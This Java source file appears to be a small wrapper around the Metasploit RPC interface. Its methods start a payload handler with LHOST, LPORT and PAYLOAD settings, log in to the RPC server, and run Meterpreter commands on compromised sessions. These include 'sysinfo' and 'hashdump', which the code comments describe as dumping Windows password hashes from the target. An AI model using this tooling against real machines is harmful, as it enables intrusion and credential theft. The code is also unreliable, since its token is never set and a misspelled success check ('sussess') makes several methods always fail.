/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package msf;

import java.lang.annotation.Documented;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Map;
import msf.ApiController;
import msf.models.MsgPackRpc;
import org.json.simple.JSONObject;

/**
 *
 * @author yasmir
 */
public class BIL {

    private String token;
    MsgPackRpc msg;
    ApiController api;

    public BIL() {
        msg = new MsgPackRpc();
        api = new ApiController(token, msg);
    }

    public void deviceSessionList() {

    }

    public void createHandler(String _host, String _lhost, String _lport, String _payload) {
        Map params = new HashMap();
        params.put("LHOST", _lhost);
        params.put("LPORT", _lport);
        params.put("PAYLOAD", _payload);

        JSONObject job_id = api.moduleExecute("exploit", "exploit/handler", params);
    }

    public JSONObject Login(String _host, int _port, String _userName, String _password) {
        msg.Connect(_host, _port, false);
        JSONObject login_Result_json = msg.rpcCall("auth.login", _userName, _password);
        return login_Result_json;
    }

    /**
     * target system information
     *
     * @param SessionID
     * @return string
     */
    public String meterpreter_SysInfo(String SessionID) {

        try {
            JSONObject Result_json = msg.rpcCall("session.meterpreter_run_single", token, SessionID, "sysinfo");
            JSONObject console_read_result = meterpreter_Read(SessionID);

            return console_read_result.get("data").toString();

        } catch (Exception e) {
            throw e;
        }
    }

    /**
     * dump windows password hash from target
     *
     * @param SessionID
     * @return
     */
    public String meterpreter_HashDump(String SessionID) throws Exception {

        JSONObject Result_json = msg.rpcCall("session.meterpreter_run_single", token, SessionID, "hashdump");
        if (Result_json.get("result").equals("sussess")) {
            JSONObject console_read_result = meterpreter_Read(SessionID);
            return console_read_result.get("data").toString();
        } else {
            throw new Exception("Error in execute command");
        }
        
    }
    
    public String meterpreter_FS_PWD(String SessionID) throws Exception {

        JSONObject Result_json = msg.rpcCall("session.meterpreter_run_single", token, SessionID, "pwd");
        if (Result_json.get("result").equals("sussess")) {
            JSONObject console_read_result = meterpreter_Read(SessionID);
            return console_read_result.get("data").toString();
        } else {
            throw new Exception("Error in execute command");
        }
        
    }

    private JSONObject meterpreter_Read(String SessionID) {
        JSONObject Result_json = msg.rpcCall("session.meterpreter_read", token, SessionID);
        return Result_json;
    }

}
